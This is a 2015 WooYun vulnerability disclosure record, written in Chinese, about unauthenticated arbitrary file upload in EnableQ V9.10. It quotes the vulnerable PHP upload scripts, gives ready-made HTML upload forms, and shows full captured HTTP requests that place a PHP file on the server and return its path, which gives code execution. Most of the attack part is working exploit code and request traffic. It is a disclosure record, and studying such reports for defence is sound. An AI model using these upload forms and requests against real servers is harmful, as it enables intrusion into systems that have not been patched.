{"id": 66102, "wybug_id": "wooyun-2015-0128219", "wybug_title": "EnableQ官方免费版存在多处任意文件上传，免登陆可直接getshell", "wybug_corp": "北京科维能动信息技术有限公司", "wybug_author": "Bear baby", "wybug_date": "2015-07-21 22:25", "wybug_open_date": "2015-10-20 13:51", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-22：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-09-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-20：\t细节向公众公开  简要描述：              《一直默默努力》版本：EnableQ_V9.10_免费版_2问卷许可证_整合安装包_For Windows下载路径：http://www.enableq.com/control/WebAPI/Download.php?downloadID=52&language=CN 详细说明：  看页面上面的下载次数还挺多的 ，26万多次下载。\n\n虽然官方已经更新到10.20但是提供的免费版还是9.10版，简单分析一下，该版本存在多处任意文件上传漏洞，导致可直接Getshell。文件位置：Android/FileUpload.php部分代码如下：\nsession_start( );require_once( ROOT_PATH.\"Entry/Global.fore.php\" );$thisFiles = \"uploadedfile_\".$_GET['optionID'];$filePhyPath = $Config['absolutenessPath'].\"/PerUserData/tmp/\";CreateDir( $filePhyPath );$time = Time( );if ( is_dir( $filePhyPath ) && ( $tmpFilePath = opendir( $filePhyPath ) ) ){\t\t\t\twhile ( ( $tmpFile = readdir( $tmpFilePath ) ) !== FALSE )\t\t\t\t{\t\t\t\t\t\t\t\t$theFileTime = filectime( $filePhyPath.$tmpFile );\t\t\t\t\t\t\t\tif ( !( $theFileTime <= $time - 86400 ) && !( $tmpFile != \"index.html\" ) )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t@unlink( $filePhyPath.$tmpFile );\t\t\t\t\t\t\t\t}\t\t\t\t}\t\t\t\tclosedir( $tmpFilePath );}if ( !isset( $_FILES[$thisFiles] ) && !is_uploaded_file( $_FILES[$thisFiles]['tmp_name'] ) && $_FILES[$thisFiles]['error'] != 0 ){\t\t\t\theader( \"HTTP/1.1 500 File Upload Error\" );\t\t\t\tif ( isset( $_FILES[$thisFiles] ) )\t\t\t\t{\t\t\t\t\t\t\t\techo \"false|\".$_GET['optionID'].\"|\".$_FILES[$thisFiles]['error'];\t\t\t\t}\t\t\t\texit( );}$question_File_ID = dmeqjch( \"_\", $thisFiles );$tmpExt = dmeqjch( \".\", $_FILES[$thisFiles]['name'] );$tmpNum = count( $tmpExt ) - 1;$extension = strtolower( $tmpExt[$tmpNum] );if ( $question_File_ID['2'] != \"\" ){\t\t\t\t$newFileName = $question_File_ID['2'].\"_\".date( \"YmdHis\", $time ).rand( 1, 999 ).\".\".$extension;}else{\t\t\t\t$newFileName = date( \"YmdHis\", $time ).rand( 1, 999 ).\".\".$extension;}if ( Copy( $_FILES[$thisFiles]['tmp_name'], $filePhyPath.$newFileName ) ){\t\t\t\techo \"true|\".$_GET['optionID'].\"|\".$newFileName;\t\t\t\texit( );}?>\n没啥验证即可上传任意文件，保存位置为PerUserData/tmp/根据上面的代码构造一个上传页面如下，\n<form action=\"http://网站/Android/FileUpload.php?optionID=1\" method=\"post\" enctype=\"multipart/form-data\" name=\"form1\" id=\"form1\">  <input type=\"file\" name=\"uploadedfile_1\" id=\"fileField\" />  <input type=\"submit\" name=\"button\" id=\"button\" value=\"提交\" /></form>\nFiddler抓包如下：\nRequestPOST http://192.168.1.253:9009/enableq/Android/FileUpload.php?optionID=1 HTTP/1.1Accept: application/x-ms-application, image/jpeg, application/xaml+xml, image/gif, image/pjpeg, application/x-ms-xbap, */*Accept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/7.0)Content-Type: multipart/form-data; boundary=---------------------------7df15424111c02Accept-Encoding: gzip, deflateConnection: Keep-AliveContent-Length: 351Host: 192.168.1.253:9009Pragma: no-cacheCookie: PHPSESSID=3db104004741b2b97d850ac25cdbfbb3-----------------------------7df15424111c02Content-Disposition: form-data; name=\"uploadedfile_1\"; filename=\"C:\\Users\\Administrator\\Desktop\\i.php\"Content-Type: application/php<?php phpinfo();?>-----------------------------7df15424111c02Content-Disposition: form-data; name=\"button\"submit-----------------------------7df15424111c02—ResponseHTTP/1.1 200 OKDate: Tue, 21 Jul 2015 13:12:48 GMTServer: Apache/2.2.19 (Win32) PHP/5.2.17X-Powered-By: PHP/5.2.17Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0Pragma: no-cacheContent-Length: 28Keep-Alive: timeout=5, max=100Connection: Keep-AliveContent-Type: text/htmltrue|1|20150721211248628.php\n对应路径即为：/PerUserData/tmp/20150721211248628.php，如下图\n\n第二处文件位置：/JS/DistributionUpload.php部分代码如下：\n$thisFiles = $_POST['uploadFileName'];$filePhyPath = $Config['absolutenessPath'].\"/PerUserData/tmp/\";CreateDir( $filePhyPath );$time = Time( );if ( is_dir( $filePhyPath ) && ( $tmpFilePath = opendir( $filePhyPath ) ) ){\t\t\t\twhile ( ( $tmpFile = readdir( $tmpFilePath ) ) !== FALSE )\t\t\t\t{\t\t\t\t\t\t\t\t$theFileTime = filectime( $filePhyPath.$tmpFile );\t\t\t\t\t\t\t\tif ( !( $theFileTime <= $time - 86400 ) && !( $tmpFile != \"index.html\" ) )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t@unlink( $filePhyPath.$tmpFile );\t\t\t\t\t\t\t\t}\t\t\t\t}\t\t\t\tclosedir( $tmpFilePath );}if ( !isset( $_FILES[$thisFiles] ) && !is_uploaded_file( $_FILES[$thisFiles]['tmp_name'] ) && $_FILES[$thisFiles]['error'] != 0 ){\t\t\t\theader( \"HTTP/1.1 500 File Upload Error\" );\t\t\t\tif ( isset( $_FILES[$thisFiles] ) )\t\t\t\t{\t\t\t\t\t\t\t\techo $_FILES[$thisFiles]['error'];\t\t\t\t}\t\t\t\texit( );}if ( file_exists( $filePhyPath.$_FILES[$thisFiles]['name'] ) ){\t\t\t\t@unlink( $filePhyPath.$_FILES[$thisFiles]['name'] );}if ( Copy( $_FILES[$thisFiles]['tmp_name'], $filePhyPath.$_FILES[$thisFiles]['name'] ) ){\t\t\t\techo $_FILES[$thisFiles]['name'];\t\t\t\texit( );}\n和第一个代码基本一致，没过滤。稍微更改下构造的上传页面如下：\n<form action=\"http://网站/JS/DistributionUpload.php\" method=\"post\" enctype=\"multipart/form-data\" name=\"form1\" id=\"form1\">  <input type=\"hidden\" name =\"uploadFileName\" value=\"uploadedfile_1\" />  <input type=\"file\" name=\"uploadedfile_1\" id=\"fileField\" />  <input type=\"submit\" name=\"button\" id=\"button\" value=\"submit\" /></form>\nFiddler抓包如下：\nPOST http://192.168.1.253:9009/enableq/JS/DistributionUpload.php HTTP/1.1Accept: application/x-ms-application, image/jpeg, application/xaml+xml, image/gif, image/pjpeg, application/x-ms-xbap, */*Accept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/7.0)Content-Type: multipart/form-data; boundary=---------------------------7df3a1a111c02Accept-Encoding: gzip, deflateConnection: Keep-AliveContent-Length: 465Host: 192.168.1.253:9009Pragma: no-cacheCookie: PHPSESSID=3db104004741b2b97d850ac25cdbfbb3-----------------------------7df3a1a111c02Content-Disposition: form-data; name=\"uploadFileName\"uploadedfile_1-----------------------------7df3a1a111c02Content-Disposition: form-data; name=\"uploadedfile_1\"; filename=\"C:\\Users\\Administrator\\Desktop\\i.php\"Content-Type: application/php<?php phpinfo();?>-----------------------------7df3a1a111c02Content-Disposition: form-data; name=\"button\"submit-----------------------------7df3a1a111c02--ResponseHTTP/1.1 200 OKDate: Tue, 21 Jul 2015 13:21:10 GMTServer: Apache/2.2.19 (Win32) PHP/5.2.17X-Powered-By: PHP/5.2.17Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0Pragma: no-cacheContent-Length: 5Keep-Alive: timeout=5, max=100Connection: Keep-AliveContent-Type: text/htmli.php\n这个倒是连文件名都没改，对应路径/PerUserData/tmp/i.php，如下图。\n\n第三处文件位置：/JS/FileUpload.php相关代码如下：\n$thisFiles = $_POST['uploadFileName'];if ( $Config['dataDomainName'] != \"\" ){\t\t\t\t$theFileTime = trim( $_POST['uploadFileTime'] );\t\t\t\t$filePhyPath = $Config['absolutenessPath'].\"/\".$Config['dataDirectory'].\"/response_\".$_POST['theSurveyID'].\"/\".date( \"Y-m\", $theFileTime ).\"/\".date( \"d\", $theFileTime ).\"/\";}else{\t\t\t\t$filePhyPath = $Config['absolutenessPath'].\"/PerUserData/tmp/\";}CreateDir( $filePhyPath );$time = Time( );if ( is_dir( $filePhyPath ) && ( $tmpFilePath = opendir( $filePhyPath ) ) ){\t\t\t\twhile ( ( $tmpFile = readdir( $tmpFilePath ) ) !== FALSE )\t\t\t\t{\t\t\t\t\t\t\t\t$theFileTime = filectime( $filePhyPath.$tmpFile );\t\t\t\t\t\t\t\tif ( !( $theFileTime <= $time - 86400 ) && !( $tmpFile != \"index.html\" ) )\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t@unlink( $filePhyPath.$tmpFile );\t\t\t\t\t\t\t\t}\t\t\t\t}\t\t\t\tclosedir( $tmpFilePath );}if ( !isset( $_FILES[$thisFiles] ) && !is_uploaded_file( $_FILES[$thisFiles]['tmp_name'] ) && $_FILES[$thisFiles]['error'] != 0 ){\t\t\t\theader( \"HTTP/1.1 500 File Upload Error\" );\t\t\t\tif ( isset( $_FILES[$thisFiles] ) )\t\t\t\t{\t\t\t\t\t\t\t\techo $_FILES[$thisFiles]['error'];\t\t\t\t}\t\t\t\texit( );}$question_File_ID = dmeqjch( \"_\", $thisFiles );$tmpExt = dmeqjch( \".\", $_FILES[$thisFiles]['name'] );$tmpNum = count( $tmpExt ) - 1;$extension = strtolower( $tmpExt[$tmpNum] );if ( $question_File_ID['1'] != \"\" ){\t\t\t\t$newFileName = $question_File_ID['1'].\"_\".date( \"YmdHis\", $time ).rand( 1, 999 ).\".\".$extension;}else{\t\t\t\t$newFileName = date( \"YmdHis\", $time ).rand( 1, 999 ).\".\".$extension;}if ( Copy( $_FILES[$thisFiles]['tmp_name'], $filePhyPath.$newFileName ) ){\t\t\t\techo $newFileName;\t\t\t\texit( );}\n构造上传页面同第二个。Fiddler抓包如下：\nRequestPOST http://192.168.1.253:9009/enableq/JS/FileUpload.php HTTP/1.1Accept: application/x-ms-application, image/jpeg, application/xaml+xml, image/gif, image/pjpeg, application/x-ms-xbap, */*Accept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/7.0)Content-Type: multipart/form-data; boundary=---------------------------7df3a1a111c02Accept-Encoding: gzip, deflateConnection: Keep-AliveContent-Length: 465Host: 192.168.1.253:9009Pragma: no-cacheCookie: PHPSESSID=3db104004741b2b97d850ac25cdbfbb3-----------------------------7df3a1a111c02Content-Disposition: form-data; name=\"uploadFileName\"uploadedfile_1-----------------------------7df3a1a111c02Content-Disposition: form-data; name=\"uploadedfile_1\"; filename=\"C:\\Users\\Administrator\\Desktop\\i.php\"Content-Type: application/php<?php phpinfo();?>-----------------------------7df3a1a111c02Content-Disposition: form-data; name=\"button\"submit-----------------------------7df3a1a111c02--ResponseHTTP/1.1 200 OKDate: Tue, 21 Jul 2015 13:26:46 GMTServer: Apache/2.2.19 (Win32) PHP/5.2.17X-Powered-By: PHP/5.2.17Expires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0Pragma: no-cacheContent-Length: 23Keep-Alive: timeout=5, max=100Connection: Keep-AliveContent-Type: text/html1_20150721212647249.php\n如下图\n\n剩下文件位置：/JS/RecFileUpload.php/JS/ReportFileUpload.php代码问题、构造上传页面和第三个一致，此处不再叙说。另有几处上传问题默认需要增强许可授权，此处不贴出。   漏洞证明：     修复方案：     版权声明：转载请注明来源 Bear baby@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-10-20 13:51 厂商回复： https:///vul/info/qid/QTVA-2014-该漏洞存在于老版本，并且在360漏洞平台上2014-12-02已经报告，并且官方已经处理。但仍然谢谢@Bear baby 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-21 22:38 |    \t\tBear baby \t\t\t( 普通白帽子  |\t\t\t        Rank:183 漏洞数:20        | 善攻者，不知其所守。善守者，不知其所攻。)\t\t \n  审核的同志幸苦了。。这么晚还在工作。向您致敬。。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}